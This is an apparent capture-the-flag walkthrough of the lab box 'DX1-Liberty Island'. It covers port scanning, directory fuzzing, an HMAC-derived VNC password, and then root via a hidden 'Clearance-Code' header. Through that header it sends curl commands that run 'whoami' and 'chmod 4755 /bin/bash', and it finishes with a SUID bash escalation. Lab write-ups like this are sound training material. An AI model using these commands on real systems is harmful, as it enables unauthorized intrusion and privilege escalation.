**Target: 10.10.215.92 DX1-Liberty Island**

**Initial Access:**\
nmap -Pn  10.10.215.92  -p- --min-rate=5000 |grep open|awk -F '/''{print $1}'|tr '\n' ','	\
Output shows open ports:  80, 5901, 23023

Let’s enumerate these open ports further with nmap: \
nmap -Pn  10.10.215.92  -p 80,5901,23023 --min-rate=5000 -sC -sV -oN nmap.txt \
Output shows:

![image](https://user-images.githubusercontent.com/93153300/200068459-d6266a1c-d2d0-4f77-a3f5-6ba3f6eb276e.png)

Navigating to port 80 shows: 

![image](https://user-images.githubusercontent.com/93153300/200086307-60d848fc-65da-47b5-bdae-b0957e2e0b09.png)

There’s a link on the bottom called ‘War in Cyberspace’. Clicking on that link takes us to a directory  /badactors.html.  \
This directory shows a list that seems like it may be usernames or passwords.  Not much more to do here, so let's brute force directories on port 80:

dirsearch -r -u http://10.10.215.92/ -e txt,php,html -f		→ Found directory: 	/robots.txt

Navigate to http://10.10.215.92/robots.txt  	→ 	Page reads: Disallow: /datacubes

Navigate to http://10.10.215.92/datacubes  	→ Automatically redirects to: http://10.10.215.92/datacubes/0000/ 

Seeing the directory /0000/ seems interesting. Perhaps the target has more hidden directories with different numbers. Test this with the following steps:
Step 1: Make a file with a list of numbers 0000-9999.  To create this list run command: \
for i in {0000..9999};do echo $i >> nlist;done\
Step 2: Fuzz the directory with command: \
wfuzz -c -w nlist -u http://10.10.215.92/datacubes/FUZZ/  --hh 274\
Output shows:

![image](https://user-images.githubusercontent.com/93153300/197628116-80ec4786-8cf6-405f-baed-4f31387c51da.png)


Wfuzz found a few hidden directories. Navigating to http://10.10.215.92/datacubes/0451/		shows:

![image](https://user-images.githubusercontent.com/93153300/197627629-912a147b-4a6c-46ee-8e95-8bd82dd96436.png)

This message is telling us what user jacobson's password is for the vnc login. It says the password is the first 8 characters of the hash generated with hmac.  

Let's generate the hmac hash.  \
Google search 'hmac online calculator'. There's plenty of hmac online calculators, we will use the hmac calculator found on https://www.freeformatter.com/hmac-generator.html.  

![image](https://user-images.githubusercontent.com/93153300/197627733-a4fcccd5-5d1b-417b-88cc-b197f684638a.png)

This shows that the input we need in order to calculate the hmac hash is: the string, secret key, and Digest algorithm. These 3 pieces of information are given to us in the message.

String= smashthestate \
hmac hashing algorithm= md5 \
Secret is not as simple, the message gives us clues that we have to piece together to figure out the secret.  

The message says that the secret is the username of the author of the message.  We don't know his username, but the message says that we can find his username in a list called bad actors. 
Earlier, when we enumerated port 80, we found a directory called /badactors.html and it looked like a list of usernames.  Look back at that list, as the message seems to be referring to that list: 

![image](https://user-images.githubusercontent.com/93153300/197627787-7e028e2a-73e1-484e-a372-ef24f25e9aaa.png)

There are many names on this list, and we don't know which username is the correct one.  However, we can take an educated guess based on two pieces of information. 
* 1. The message shows that the authors initials are 'JL'.\
* 2. Looking over the list on /badactors.html, it seems like the usernames consist of first name last name, where the first name is only an initial of his first name. 

Based on this, jlebedev seems to be the secret.  \
Now that we have the string, secret, and the hmac hashing algorithm, let's run the hmac converter.
The hmac converter produces: 311781a1830c1332a903920a59eb6d7a
 
The message tells us his password is the first 8 letters of the hash: 311781a1 \
Now that we have a username and password, log in to vnc with command:\
vncviewer  10.10.215.92:5901   → when it prompts for password enter: 	311781a1\
Vnc opens a gui as user ajacobson.  Open user.txt to get the first flag.

![image](https://user-images.githubusercontent.com/93153300/197627944-85fd8bb9-caf4-4526-bb3c-57fb9d390f82.png)
___________________________________________________________________
**Privilege Escalation:**\
Manual enumeration and running linpeas didn't find anything of interest.  Going back to the desktop, there’s a file called badactors-list.  Opening that file we see it starts by connecting to http://UNATCO:23023:

![image](https://user-images.githubusercontent.com/93153300/197628205-12266368-ba69-4bde-b63f-a7d07472f5fe.png) 

We know from our initial nmap scan that port 23023 is open to the public. Before going to port 23023, add into /etc/hosts: 10.10.215.92 UNATCO.   Navigating to http://UNATCO:23023 shows:

![image](https://user-images.githubusercontent.com/93153300/197628453-e25f9bc2-2f07-4500-b822-15bb70ea8626.png)
 
Not much we can do here, so open tcpdump to listen to this file badactors-list and see if anything interesting shows up when we run the file.  The target shell won’t let us use tcpdump, so download the file to our pc and then we will run tcpdump on locally on the file.  \
To donwload the file:
Step 1: From the target gui, open a terminal
Step 2: Go to the directory where the file badactors-list is located: python3 -m http.server 8000\
Step 3: On our pc run command  →   wget http://10.10.215.92:8000/badactors-list

Now that we have the file on our pc, make the file an executable with command: chmod +x badactors-list. \
Next, run tcpdump listener with command: tcpdump -A -i tun0 port 23023 \
Finally, run badactors-list:    ./badactors-list\
tcpdump captures some interesting information:

![image](https://user-images.githubusercontent.com/93153300/197628500-f7735841-2353-427e-95a1-944d263ad58e.png)

The ‘Clearance-Code’ header is very unusual, and ‘directive=’  seems to run commands.  
Let’s try to use this to run commands:    \
curl http://10.10.215.92:23023 -H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" -d "directive=whoami"   → we get a response: root.    This shows we have remote command execution as root.

Use this to change '/bin/bash' on the target to have suid permissions.  We can do this by running command:\
curl http://10.10.215.92:23023 -H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" -d "directive=chmod 4755 /bin/bash"

Go back to the vnc gui we have on ajacobson.  Open a terminal and run command: /bin/bash -p \
We now have shell as root, open root.txt to get the flag.

![image](https://user-images.githubusercontent.com/93153300/200085771-bd4c8159-6dbf-4761-ae0b-7e68c647f7d0.png)

